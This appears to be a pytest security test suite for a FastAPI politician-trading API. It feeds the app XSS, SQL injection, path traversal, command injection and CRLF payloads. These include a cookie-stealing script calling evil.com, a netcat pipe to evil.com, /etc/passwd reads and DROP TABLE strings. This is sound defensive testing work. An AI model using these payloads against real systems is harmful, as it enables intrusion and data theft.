"""
Tests for XSS (Cross-Site Scripting) protection.

Ensures that user input is properly sanitized and XSS attacks are prevented.
"""

import pytest
from fastapi.testclient import TestClient


class TestXSSProtection:
    """Test XSS attack prevention."""

    def test_xss_in_politician_name(self, client: TestClient, auth_headers: dict):
        """Test XSS in politician name is blocked."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "';alert('XSS');//",
            "<body onload=alert('XSS')>",
        ]

        for payload in xss_payloads:
            response = client.post(
                "/api/v1/politicians",
                headers=auth_headers,
                json={
                    "name": payload,
                    "party": "Test",
                    "state": "CA",
                    "chamber": "senate"
                }
            )

            # Should either reject (400) or sanitize
            if response.status_code == 201:
                data = response.json()
                # Check that script tags are removed
                assert "<script>" not in data["name"].lower()
                assert "javascript:" not in data["name"].lower()
                assert "onerror" not in data["name"].lower()
            else:
                # Should be rejected with validation error
                assert response.status_code in [400, 422]

    def test_xss_in_trade_ticker(self, client: TestClient):
        """Test XSS in trade ticker is blocked."""
        response = client.get(
            "/api/v1/trades",
            params={"ticker": "<script>alert('XSS')</script>"}
        )

        # Should be rejected
        assert response.status_code == 400
        assert "invalid ticker" in response.json()["detail"].lower()

    def test_xss_in_search_query(self, client: TestClient):
        """Test XSS in search queries is blocked."""
        xss_queries = [
            "<script>alert(document.cookie)</script>",
            "';DROP TABLE users;--",
            "../../../etc/passwd",
            "../../../../windows/system32/config/sam",
        ]

        for query in xss_queries:
            response = client.get(
                "/api/v1/politicians",
                params={"search": query}
            )

            # Should handle safely (not return 500)
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                data = response.json()
                # Should not contain unsafe content
                for politician in data.get("politicians", []):
                    assert "<script>" not in str(politician)
                    assert "DROP TABLE" not in str(politician)

    def test_xss_in_json_payload(self, client: TestClient, auth_headers: dict):
        """Test XSS in JSON payload is handled."""
        payload = {
            "ticker": "AAPL",
            "notes": "<script>fetch('http://evil.com?cookie=' + document.cookie)</script>",
            "amount": 10000
        }

        response = client.post(
            "/api/v1/trades",
            headers=auth_headers,
            json=payload
        )

        # Should either reject or sanitize
        if response.status_code == 201:
            data = response.json()
            # Script tags should be removed
            if "notes" in data:
                assert "<script>" not in data["notes"].lower()
                assert "document.cookie" not in data["notes"].lower()

    def test_xss_in_url_parameters(self, client: TestClient):
        """Test XSS in URL parameters."""
        dangerous_params = {
            "ticker": "AAPL<script>alert('XSS')</script>",
            "sort": "name'; DROP TABLE trades;--",
            "limit": "100<img src=x onerror=alert(1)>",
        }

        response = client.get("/api/v1/trades", params=dangerous_params)

        # Should handle safely
        assert response.status_code in [200, 400, 422]
        # Should not return 500 (server error)
        assert response.status_code != 500

    def test_stored_xss_prevention(self, client: TestClient, auth_headers: dict):
        """Test stored XSS is prevented."""
        # Try to store XSS payload
        xss_payload = {
            "name": "John Doe",
            "bio": "<script>alert('Stored XSS')</script>",
            "party": "Independent",
            "state": "CA",
            "chamber": "senate"
        }

        # Create politician with XSS in bio
        create_response = client.post(
            "/api/v1/politicians",
            headers=auth_headers,
            json=xss_payload
        )

        if create_response.status_code == 201:
            politician_id = create_response.json()["id"]

            # Retrieve politician
            get_response = client.get(f"/api/v1/politicians/{politician_id}")

            assert get_response.status_code == 200
            data = get_response.json()

            # Bio should be sanitized
            if "bio" in data:
                assert "<script>" not in data["bio"].lower()
                assert "alert" not in data["bio"].lower()

    def test_html_encoding_in_output(self, client: TestClient):
        """Test that HTML special characters are properly encoded."""
        response = client.get("/api/v1/politicians")

        if response.status_code == 200:
            data = response.json()
            json_str = str(data)

            # Check that common XSS vectors are not present unencoded
            dangerous_patterns = [
                "<script>",
                "javascript:",
                "onerror=",
                "onload=",
                "onclick=",
            ]

            for pattern in dangerous_patterns:
                assert pattern not in json_str.lower()


class TestSQLInjection:
    """Test SQL injection protection."""

    def test_sql_injection_in_ticker_filter(self, client: TestClient):
        """Test SQL injection attempts in ticker filter."""
        sql_payloads = [
            "AAPL' OR '1'='1",
            "AAPL'; DROP TABLE trades;--",
            "AAPL' UNION SELECT * FROM users--",
            "AAPL' AND 1=1--",
            "'; DELETE FROM trades WHERE '1'='1",
        ]

        for payload in sql_payloads:
            response = client.get(
                "/api/v1/trades",
                params={"ticker": payload}
            )

            # Should be rejected with validation error, not SQL error
            assert response.status_code == 400
            assert "invalid ticker" in response.json()["detail"].lower()

            # Should NOT contain SQL error messages
            error_text = str(response.json()).lower()
            assert "syntax error" not in error_text
            assert "postgresql" not in error_text
            assert "sqlalchemy" not in error_text

    def test_sql_injection_in_politician_id(self, client: TestClient):
        """Test SQL injection in politician ID parameter."""
        sql_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE politicians;--",
            "1 UNION SELECT * FROM users",
        ]

        for payload in sql_payloads:
            response = client.get(f"/api/v1/politicians/{payload}")

            # Should return 400 or 404, not 500
            assert response.status_code in [400, 404, 422]

            # Should not expose SQL errors
            if "detail" in response.json():
                detail = str(response.json()["detail"]).lower()
                assert "sql" not in detail
                assert "database" not in detail

    def test_sql_injection_in_sort_parameter(self, client: TestClient):
        """Test SQL injection in sort/order parameters."""
        response = client.get(
            "/api/v1/trades",
            params={"sort": "transaction_date; DROP TABLE trades;--"}
        )

        # Should handle safely
        assert response.status_code in [200, 400, 422]

        # Should not return SQL error
        assert response.status_code != 500


class TestPathTraversal:
    """Test path traversal protection."""

    def test_path_traversal_in_export(self, client: TestClient, auth_headers: dict):
        """Test path traversal attacks in file export."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        ]

        for path in dangerous_paths:
            response = client.post(
                "/api/v1/export",
                headers=auth_headers,
                json={"filename": path, "format": "csv"}
            )

            # Should reject dangerous paths
            assert response.status_code in [400, 422]


class TestCommandInjection:
    """Test command injection protection."""

    def test_command_injection_in_ticker(self, client: TestClient):
        """Test command injection attempts."""
        command_payloads = [
            "AAPL; ls -la",
            "AAPL && cat /etc/passwd",
            "AAPL | nc evil.com 1234",
            "AAPL`whoami`",
            "AAPL$(whoami)",
        ]

        for payload in command_payloads:
            response = client.get(
                "/api/v1/trades",
                params={"ticker": payload}
            )

            # Should be rejected
            assert response.status_code == 400


class TestHeaderInjection:
    """Test HTTP header injection protection."""

    def test_crlf_injection_in_headers(self, client: TestClient):
        """Test CRLF injection in response headers."""
        response = client.get(
            "/api/v1/trades",
            headers={"X-Custom-Header": "value\r\nInjected-Header: malicious"}
        )

        # Should handle safely
        assert response.status_code in [200, 400]

        # Check that injected header doesn't appear
        assert "Injected-Header" not in response.headers


# Regression tests for fixed vulnerabilities
class TestRegressionSecurity:
    """Regression tests for previously found security issues."""

    def test_no_debug_info_in_production_errors(self, client: TestClient):
        """Test that error responses don't leak debug info."""
        # Cause an error
        response = client.get("/api/v1/trades/invalid-uuid-format")

        # Error response should not contain:
        # - File paths
        # - Stack traces
        # - Internal variable names
        # - SQL queries

        error_json = str(response.json()).lower()

        sensitive_patterns = [
            "/app/",
            "traceback",
            "file \"",
            "line ",
            "select * from",
            "sqlalchemy",
        ]

        for pattern in sensitive_patterns:
            assert pattern not in error_json, f"Error response leaked: {pattern}"

    def test_rate_limiting_prevents_brute_force(self, client: TestClient):
        """Test that rate limiting prevents brute force attacks."""
        # Make many login attempts
        for i in range(10):
            response = client.post(
                "/api/v1/auth/login",
                json={
                    "username": "test",
                    "password": f"wrong_password_{i}"
                }
            )

        # Should eventually get rate limited
        # (This assumes rate limiting is configured)
        # Some responses should be 429
        assert any(r.status_code == 429 for r in [response])
